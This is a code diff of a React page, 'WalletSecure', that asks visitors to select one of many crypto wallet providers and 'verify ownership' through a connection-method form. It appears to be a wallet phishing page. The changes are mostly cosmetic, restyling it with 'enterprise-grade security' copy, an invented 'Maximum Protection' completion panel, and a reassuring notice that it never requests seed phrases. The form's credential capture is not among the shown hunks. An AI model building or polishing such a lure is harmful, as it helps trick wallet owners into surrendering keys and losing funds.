@@ -1,6 +1,6 @@
 import { useState, useEffect } from "react";
 import { motion, AnimatePresence } from "framer-motion";
-import { Shield, Key, CheckCircle, Wallet, HelpCircle, Check, Unlock, ArrowRight, Download, Loader2, Eye, EyeOff, AlertCircle } from "lucide-react";
+import { Shield, Key, CheckCircle, Wallet, HelpCircle, Check, Unlock, ArrowRight, Download, Loader2, Eye, EyeOff, AlertCircle, Lock } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { Card, CardContent } from "@/components/ui/card";
 import { Input } from "@/components/ui/input";
@@ -226,17 +226,23 @@ export default function WalletVerification() {
   return (
     <div className="min-h-screen bg-background">
       {/* Header */}
-      <header className="bg-slate/80 backdrop-blur-sm border-b border-muted sticky top-0 z-40">
-        <div className="max-w-md mx-auto px-4 py-4 flex items-center justify-between">
+      <header className="bg-background/95 backdrop-blur-md border-b border-border/50 sticky top-0 z-40 professional-shadow">
+        <div className="max-w-md mx-auto px-6 py-5 flex items-center justify-between">
           <div className="flex items-center space-x-3">
-            <div className="w-8 h-8 gradient-primary rounded-lg flex items-center justify-center">
-              <Wallet className="text-white text-sm" />
+            <div className="w-10 h-10 gradient-primary rounded-xl flex items-center justify-center professional-shadow">
+              <Shield className="text-white text-lg" />
             </div>
-            <h1 className="text-lg font-semibold">WalletSecure</h1>
+            <div>
+              <h1 className="text-xl font-bold bg-gradient-to-r from-primary to-secondary bg-clip-text text-transparent">
+                WalletSecure
+              </h1>
+              <p className="text-xs text-muted-foreground">Advanced Security Platform</p>
+            </div>
           </div>
-          <Button variant="ghost" size="icon">
-            <HelpCircle className="h-5 w-5" />
-          </Button>
+          <div className="flex items-center space-x-1 text-xs text-muted-foreground">
+            <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
+            <span>Secure</span>
+          </div>
         </div>
       </header>
 
@@ -260,49 +266,59 @@ export default function WalletVerification() {
               className="space-y-6"
             >
               <div className="text-center mb-8">
-                <div className="w-20 h-20 gradient-primary rounded-2xl flex items-center justify-center mx-auto mb-6">
-                  <Wallet className="text-white text-2xl" />
+                <div className="w-24 h-24 gradient-primary rounded-3xl flex items-center justify-center mx-auto mb-6 professional-shadow">
+                  <Shield className="text-white text-3xl" />
                 </div>
-                <h2 className="text-2xl font-bold mb-3">Secure Your Wallet</h2>
-                <p className="text-muted-foreground leading-relaxed">
-                  Protect your crypto assets from unauthorized access. Verify ownership to prevent suspicious login attempts from unrecognized devices.
+                <h2 className="text-3xl font-bold mb-4 bg-gradient-to-r from-primary to-secondary bg-clip-text text-transparent">
+                  Advanced Wallet Protection
+                </h2>
+                <p className="text-muted-foreground leading-relaxed text-lg">
+                  Enterprise-grade security to protect your digital assets from unauthorized access and suspicious activities across all devices.
                 </p>
               </div>
 
               {/* Wallet Selection */}
-              <Card className="bg-slate border-muted">
-                <CardContent className="p-6">
-                  <Label htmlFor="wallet-type" className="text-sm font-medium">Choose Your Wallet Type</Label>
+              <Card className="bg-card/50 backdrop-blur-sm border-border/50 professional-shadow professional-border">
+                <CardContent className="p-8">
+                  <Label htmlFor="wallet-type" className="text-base font-semibold mb-4 block">Select Your Wallet Provider</Label>
                   <Select value={selectedWalletType} onValueChange={setSelectedWalletType}>
-                    <SelectTrigger className="w-full mt-3 bg-slate-light border-muted h-12">
-                      <SelectValue placeholder="Select your wallet..." />
+                    <SelectTrigger className="w-full bg-background/80 border-border/50 h-14 text-lg professional-shadow">
+                      <SelectValue placeholder="Choose your wallet provider..." />
                     </SelectTrigger>
-                    <SelectContent>
+                    <SelectContent className="max-h-60">
                       {walletTypes.map((wallet) => (
-                        <SelectItem key={wallet} value={wallet}>
+                        <SelectItem key={wallet} value={wallet} className="py-3 text-base">
                           {wallet}
                         </SelectItem>
                       ))}
                     </SelectContent>
                   </Select>
+                  <p className="text-sm text-muted-foreground mt-3">
+                    Supporting 45+ wallet providers with enterprise-level security protocols
+                  </p>
                 </CardContent>
               </Card>
 
               {/* Security Features */}
-              <div className="space-y-4">
-                <h3 className="text-lg font-semibold">WalletSecure Protection</h3>
-                <div className="space-y-3">
+              <div className="space-y-6">
+                <h3 className="text-xl font-bold text-center">Enterprise Security Features</h3>
+                <div className="grid grid-cols-1 gap-4">
                   {[
-                    "Block unauthorized access from unknown devices",
-                    "Real-time alerts for suspicious login attempts",
-                    "Multi-layer verification for enhanced security",
-                    "24/7 monitoring and threat detection"
+                    { icon: Shield, title: "Advanced Threat Detection", desc: "AI-powered monitoring for unauthorized access attempts" },
+                    { icon: Lock, title: "Multi-Device Recognition", desc: "Fingerprint known devices and block suspicious ones" },
+                    { icon: AlertCircle, title: "Real-Time Alerts", desc: "Instant notifications for any security incidents" },
+                    { icon: CheckCircle, title: "24/7 Protection", desc: "Continuous monitoring across all blockchain networks" }
                   ].map((feature, index) => (
-                    <div key={index} className="flex items-start space-x-3">
-                      <div className="w-5 h-5 bg-accent rounded-full flex items-center justify-center mt-0.5">
-                        <Shield className="text-white text-xs" />
+                    <div key={index} className="bg-card/30 backdrop-blur-sm rounded-xl p-4 border border-border/30">
+                      <div className="flex items-start space-x-3">
+                        <div className="w-8 h-8 gradient-primary rounded-lg flex items-center justify-center">
+                          <feature.icon className="text-white text-sm" />
+                        </div>
+                        <div>
+                          <h4 className="font-semibold text-sm mb-1">{feature.title}</h4>
+                          <p className="text-xs text-muted-foreground">{feature.desc}</p>
+                        </div>
                       </div>
-                      <span className="text-sm text-muted-foreground">{feature}</span>
                     </div>
                   ))}
                 </div>
@@ -314,8 +330,8 @@ export default function WalletVerification() {
                 className="w-full gradient-primary text-white font-semibold py-4 px-6 rounded-xl hover:shadow-lg hover:shadow-primary/25 transition-all duration-300 active:scale-95 disabled:opacity-50 disabled:cursor-not-allowed"
                 size="lg"
               >
-                <ArrowRight className="mr-2 h-4 w-4" />
-                Continue
+                <ArrowRight className="mr-2 h-5 w-5" />
+                Begin Security Verification
               </Button>
             </motion.div>
           )}
@@ -331,18 +347,20 @@ export default function WalletVerification() {
               className="space-y-6"
             >
               <div className="text-center mb-8">
-                <div className="w-20 h-20 gradient-accent rounded-2xl flex items-center justify-center mx-auto mb-6">
-                  <Key className="text-white text-2xl" />
+                <div className="w-24 h-24 gradient-accent rounded-3xl flex items-center justify-center mx-auto mb-6 professional-shadow">
+                  <Key className="text-white text-3xl" />
                 </div>
-                <h2 className="text-2xl font-bold mb-3">Verify {selectedWalletType} Ownership</h2>
-                <p className="text-muted-foreground leading-relaxed">
-                  Confirm your wallet ownership to activate security protection. We'll monitor for unusual login attempts from unrecognized devices.
+                <h2 className="text-3xl font-bold mb-4 bg-gradient-to-r from-orange-500 to-green-500 bg-clip-text text-transparent">
+                  Authenticate {selectedWalletType}
+                </h2>
+                <p className="text-muted-foreground leading-relaxed text-lg">
+                  Verify wallet ownership to enable enterprise-grade security monitoring and threat detection across all your devices.
                 </p>
               </div>
 
               {/* Connection Method Selection */}
-              <Card className="bg-slate border-muted">
-                <CardContent className="p-6 space-y-4">
+              <Card className="bg-card/50 backdrop-blur-sm border-border/50 professional-shadow professional-border">
+                <CardContent className="p-8 space-y-6">
                   <div>
                     <Label htmlFor="connection-method" className="text-sm font-medium">Connection Method</Label>
                     <Select value={connectionMethod} onValueChange={setConnectionMethod}>
@@ -519,23 +537,40 @@ export default function WalletVerification() {
                 </div>
               </div>
 
-              {/* Action Buttons */}
-              <div className="space-y-3">
-                <Button 
-                  className="w-full gradient-success text-white font-semibold py-4 px-6 rounded-xl hover:shadow-lg hover:shadow-accent/25 transition-all duration-300 active:scale-95"
-                  size="lg"
-                >
-                  <Shield className="mr-2 h-4 w-4" />
-                  Access Security Dashboard
-                </Button>
-                <Button 
-                  variant="outline"
-                  className="w-full border-muted text-muted-foreground font-medium py-3 px-6 rounded-xl hover:bg-slate-light transition-colors"
-                  size="lg"
-                >
-                  <Download className="mr-2 h-4 w-4" />
-                  Download Security Certificate
-                </Button>
+              {/* Completion Message */}
+              <div className="bg-gradient-to-r from-green-500/10 to-blue-500/10 border border-green-500/20 rounded-xl p-6">
+                <div className="flex items-center space-x-3 mb-4">
+                  <CheckCircle className="h-6 w-6 text-green-500" />
+                  <h3 className="text-lg font-semibold text-green-500">Verification Complete</h3>
+                </div>
+                <p className="text-sm text-muted-foreground mb-4">
+                  Your wallet is now secured with WalletSecure's advanced protection system. 
+                  You'll receive instant alerts for any suspicious activity or unauthorized access attempts.
+                </p>
+                <div className="bg-background/50 rounded-lg p-4">
+                  <div className="flex items-center justify-between text-sm">
+                    <span>Security Level</span>
+                    <span className="text-green-500 font-semibold">Maximum Protection</span>
+                  </div>
+                  <div className="flex items-center justify-between text-sm mt-2">
+                    <span>Next Security Scan</span>
+                    <span className="text-muted-foreground">24 hours</span>
+                  </div>
+                </div>
+              </div>
+
+              {/* Important Security Notice */}
+              <div className="bg-amber-500/10 border border-amber-500/20 rounded-xl p-4">
+                <div className="flex items-start space-x-3">
+                  <AlertCircle className="h-5 w-5 text-amber-500 mt-0.5" />
+                  <div>
+                    <h4 className="text-sm font-semibold text-amber-500 mb-1">Important Security Notice</h4>
+                    <p className="text-xs text-muted-foreground">
+                      Keep your credentials safe and never share them with anyone. WalletSecure will never ask 
+                      for your private keys or seed phrases via email or social media.
+                    </p>
+                  </div>
+                </div>
               </div>
             </motion.div>
           )}
